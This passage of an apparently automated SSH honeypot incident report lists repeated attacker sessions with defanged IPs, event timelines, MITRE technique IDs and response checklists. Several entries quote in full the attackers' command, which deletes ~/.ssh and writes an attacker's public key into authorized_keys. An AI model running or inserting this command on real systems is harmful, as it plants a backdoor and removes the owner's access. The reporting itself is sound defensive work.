| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:06:56` | `cowrie.session.connect` |
| `2026-04-20 20:06:56` | `cowrie.client.version` |
| `2026-04-20 20:06:56` | `cowrie.client.kex` |
| `2026-04-20 20:06:56` | `cowrie.login.success` |
| `2026-04-20 20:06:57` | `cowrie.session.params` |
| `2026-04-20 20:06:57` | `cowrie.command.input` |
| `2026-04-20 20:06:57` | `cowrie.command.failed` |
| `2026-04-20 20:06:57` | `cowrie.log.closed` |
| `2026-04-20 20:06:57` | `cowrie.session.params` |
| `2026-04-20 20:06:57` | `cowrie.command.input` |
| `2026-04-20 20:06:57` | `cowrie.session.file_download` |
| `2026-04-20 20:06:57` | `cowrie.log.closed` |
| `2026-04-20 20:07:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.253.45[.]10` to AbuseIPDB if not already reported
- [ ] Block `46.253.45[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cade1cdb84fa

| Field | Detail |
|---|---|
| **Source IP** | `46.253.45[.]10` |
| **First Seen** | 2026-04-20 20:06 |
| **Last Seen** | 2026-04-20 20:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:06:59` | `cowrie.session.connect` |
| `2026-04-20 20:06:59` | `cowrie.client.version` |
| `2026-04-20 20:06:59` | `cowrie.client.kex` |
| `2026-04-20 20:07:00` | `cowrie.login.success` |
| `2026-04-20 20:07:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.253.45[.]10` to AbuseIPDB if not already reported
- [ ] Block `46.253.45[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf6c49c07e8c

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-20 20:07 |
| **Last Seen** | 2026-04-20 20:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:07:15` | `cowrie.session.connect` |
| `2026-04-20 20:07:15` | `cowrie.client.version` |
| `2026-04-20 20:07:15` | `cowrie.client.kex` |
| `2026-04-20 20:07:16` | `cowrie.login.success` |
| `2026-04-20 20:07:16` | `cowrie.session.params` |
| `2026-04-20 20:07:16` | `cowrie.command.input` |
| `2026-04-20 20:07:16` | `cowrie.command.failed` |
| `2026-04-20 20:07:16` | `cowrie.log.closed` |
| `2026-04-20 20:07:17` | `cowrie.session.params` |
| `2026-04-20 20:07:17` | `cowrie.command.input` |
| `2026-04-20 20:07:17` | `cowrie.session.file_download` |
| `2026-04-20 20:07:17` | `cowrie.log.closed` |
| `2026-04-20 20:07:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f00321f72d1

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-20 20:07 |
| **Last Seen** | 2026-04-20 20:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:07:19` | `cowrie.session.connect` |
| `2026-04-20 20:07:19` | `cowrie.client.version` |
| `2026-04-20 20:07:19` | `cowrie.client.kex` |
| `2026-04-20 20:07:20` | `cowrie.login.success` |
| `2026-04-20 20:07:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85c879d3a7e3

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-04-20 20:08 |
| **Last Seen** | 2026-04-20 20:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:08:27` | `cowrie.session.connect` |
| `2026-04-20 20:08:27` | `cowrie.client.version` |
| `2026-04-20 20:08:27` | `cowrie.client.kex` |
| `2026-04-20 20:08:28` | `cowrie.login.success` |
| `2026-04-20 20:08:29` | `cowrie.session.params` |
| `2026-04-20 20:08:29` | `cowrie.command.input` |
| `2026-04-20 20:08:29` | `cowrie.command.failed` |
| `2026-04-20 20:08:29` | `cowrie.log.closed` |
| `2026-04-20 20:08:29` | `cowrie.session.params` |
| `2026-04-20 20:08:29` | `cowrie.command.input` |
| `2026-04-20 20:08:30` | `cowrie.session.file_download` |
| `2026-04-20 20:08:30` | `cowrie.log.closed` |
| `2026-04-20 20:08:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-256a0183d1b3

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-04-20 20:08 |
| **Last Seen** | 2026-04-20 20:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:08:33` | `cowrie.session.connect` |
| `2026-04-20 20:08:33` | `cowrie.client.version` |
| `2026-04-20 20:08:33` | `cowrie.client.kex` |
| `2026-04-20 20:08:34` | `cowrie.login.success` |
| `2026-04-20 20:08:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f89500280f02

| Field | Detail |
|---|---|
| **Source IP** | `46.253.45[.]10` |
| **First Seen** | 2026-04-20 20:08 |
| **Last Seen** | 2026-04-20 20:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:08:34` | `cowrie.session.connect` |
| `2026-04-20 20:08:34` | `cowrie.client.version` |
| `2026-04-20 20:08:34` | `cowrie.client.kex` |
| `2026-04-20 20:08:34` | `cowrie.login.success` |
| `2026-04-20 20:08:35` | `cowrie.session.params` |
| `2026-04-20 20:08:35` | `cowrie.command.input` |
| `2026-04-20 20:08:35` | `cowrie.command.failed` |
| `2026-04-20 20:08:35` | `cowrie.log.closed` |
| `2026-04-20 20:08:35` | `cowrie.session.params` |
| `2026-04-20 20:08:35` | `cowrie.command.input` |
| `2026-04-20 20:08:35` | `cowrie.session.file_download` |
| `2026-04-20 20:08:35` | `cowrie.log.closed` |
| `2026-04-20 20:08:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.253.45[.]10` to AbuseIPDB if not already reported
- [ ] Block `46.253.45[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f728e975a1ce

| Field | Detail |
|---|---|
| **Source IP** | `46.253.45[.]10` |
| **First Seen** | 2026-04-20 20:08 |
| **Last Seen** | 2026-04-20 20:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:08:37` | `cowrie.session.connect` |
| `2026-04-20 20:08:37` | `cowrie.client.version` |
| `2026-04-20 20:08:37` | `cowrie.client.kex` |
| `2026-04-20 20:08:38` | `cowrie.login.success` |
| `2026-04-20 20:08:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.253.45[.]10` to AbuseIPDB if not already reported
- [ ] Block `46.253.45[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2db758e3e94a

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-20 20:08 |
| **Last Seen** | 2026-04-20 20:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:08:48` | `cowrie.session.connect` |
| `2026-04-20 20:08:48` | `cowrie.client.version` |
| `2026-04-20 20:08:49` | `cowrie.client.kex` |
| `2026-04-20 20:08:49` | `cowrie.login.success` |
| `2026-04-20 20:08:49` | `cowrie.session.params` |
| `2026-04-20 20:08:49` | `cowrie.command.input` |
| `2026-04-20 20:08:49` | `cowrie.command.failed` |
| `2026-04-20 20:08:50` | `cowrie.log.closed` |
| `2026-04-20 20:08:50` | `cowrie.session.params` |
| `2026-04-20 20:08:50` | `cowrie.command.input` |
| `2026-04-20 20:08:50` | `cowrie.session.file_download` |
| `2026-04-20 20:08:50` | `cowrie.log.closed` |
| `2026-04-20 20:08:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c172a7ead403

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-20 20:08 |
| **Last Seen** | 2026-04-20 20:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:08:52` | `cowrie.session.connect` |
| `2026-04-20 20:08:52` | `cowrie.client.version` |
| `2026-04-20 20:08:53` | `cowrie.client.kex` |
| `2026-04-20 20:08:53` | `cowrie.login.success` |
| `2026-04-20 20:08:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c9b841bde5d

| Field | Detail |
|---|---|
| **Source IP** | `46.253.45[.]10` |
| **First Seen** | 2026-04-20 20:11 |
| **Last Seen** | 2026-04-20 20:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:11:37` | `cowrie.session.connect` |
| `2026-04-20 20:11:37` | `cowrie.client.version` |
| `2026-04-20 20:11:37` | `cowrie.client.kex` |
| `2026-04-20 20:11:37` | `cowrie.login.success` |
| `2026-04-20 20:11:37` | `cowrie.session.params` |
| `2026-04-20 20:11:37` | `cowrie.command.input` |
| `2026-04-20 20:11:37` | `cowrie.command.failed` |
| `2026-04-20 20:11:38` | `cowrie.log.closed` |
| `2026-04-20 20:11:38` | `cowrie.session.params` |
| `2026-04-20 20:11:38` | `cowrie.command.input` |
| `2026-04-20 20:11:38` | `cowrie.session.file_download` |
| `2026-04-20 20:11:38` | `cowrie.log.closed` |
| `2026-04-20 20:11:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.253.45[.]10` to AbuseIPDB if not already reported
- [ ] Block `46.253.45[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46b93951c94b

| Field | Detail |
|---|---|
| **Source IP** | `46.253.45[.]10` |
| **First Seen** | 2026-04-20 20:11 |
| **Last Seen** | 2026-04-20 20:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:11:40` | `cowrie.session.connect` |
| `2026-04-20 20:11:40` | `cowrie.client.version` |
| `2026-04-20 20:11:40` | `cowrie.client.kex` |
| `2026-04-20 20:11:41` | `cowrie.login.success` |
| `2026-04-20 20:11:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.253.45[.]10` to AbuseIPDB if not already reported
- [ ] Block `46.253.45[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3678532b0f54

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-20 20:12 |
| **Last Seen** | 2026-04-20 20:12 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:12:20` | `cowrie.session.connect` |
| `2026-04-20 20:12:20` | `cowrie.client.version` |
| `2026-04-20 20:12:21` | `cowrie.client.kex` |
| `2026-04-20 20:12:22` | `cowrie.login.success` |
| `2026-04-20 20:12:23` | `cowrie.session.params` |
| `2026-04-20 20:12:23` | `cowrie.command.input` |
| `2026-04-20 20:12:23` | `cowrie.command.failed` |
| `2026-04-20 20:12:23` | `cowrie.log.closed` |
| `2026-04-20 20:12:24` | `cowrie.session.params` |
| `2026-04-20 20:12:24` | `cowrie.command.input` |
| `2026-04-20 20:12:24` | `cowrie.session.file_download` |
| `2026-04-20 20:12:24` | `cowrie.log.closed` |
| `2026-04-20 20:12:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-158acf813e82

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-20 20:12 |
| **Last Seen** | 2026-04-20 20:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:12:28` | `cowrie.session.connect` |
| `2026-04-20 20:12:28` | `cowrie.client.version` |
| `2026-04-20 20:12:29` | `cowrie.client.kex` |
| `2026-04-20 20:12:30` | `cowrie.login.success` |
| `2026-04-20 20:12:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6aa38a8d453d

| Field | Detail |
|---|---|
| **Source IP** | `46.253.45[.]10` |
| **First Seen** | 2026-04-20 20:13 |
| **Last Seen** | 2026-04-20 20:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:13:04` | `cowrie.session.connect` |
| `2026-04-20 20:13:04` | `cowrie.client.version` |
| `2026-04-20 20:13:04` | `cowrie.client.kex` |
| `2026-04-20 20:13:04` | `cowrie.login.success` |
| `2026-04-20 20:13:05` | `cowrie.session.params` |
| `2026-04-20 20:13:05` | `cowrie.command.input` |
| `2026-04-20 20:13:05` | `cowrie.command.failed` |
| `2026-04-20 20:13:05` | `cowrie.log.closed` |
| `2026-04-20 20:13:05` | `cowrie.session.params` |
| `2026-04-20 20:13:05` | `cowrie.command.input` |
| `2026-04-20 20:13:05` | `cowrie.session.file_download` |
| `2026-04-20 20:13:05` | `cowrie.log.closed` |
| `2026-04-20 20:13:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.253.45[.]10` to AbuseIPDB if not already reported
- [ ] Block `46.253.45[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f832ba576db

| Field | Detail |
|---|---|
| **Source IP** | `46.253.45[.]10` |
| **First Seen** | 2026-04-20 20:13 |
| **Last Seen** | 2026-04-20 20:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:13:07` | `cowrie.session.connect` |
| `2026-04-20 20:13:07` | `cowrie.client.version` |
| `2026-04-20 20:13:08` | `cowrie.client.kex` |
| `2026-04-20 20:13:08` | `cowrie.login.success` |
| `2026-04-20 20:13:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.253.45[.]10` to AbuseIPDB if not already reported
- [ ] Block `46.253.45[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df1f07b78d63

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-04-20 20:13 |
| **Last Seen** | 2026-04-20 20:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:13:25` | `cowrie.session.connect` |
| `2026-04-20 20:13:25` | `cowrie.client.version` |
| `2026-04-20 20:13:25` | `cowrie.client.kex` |
| `2026-04-20 20:13:26` | `cowrie.login.success` |
| `2026-04-20 20:13:27` | `cowrie.session.params` |
| `2026-04-20 20:13:27` | `cowrie.command.input` |
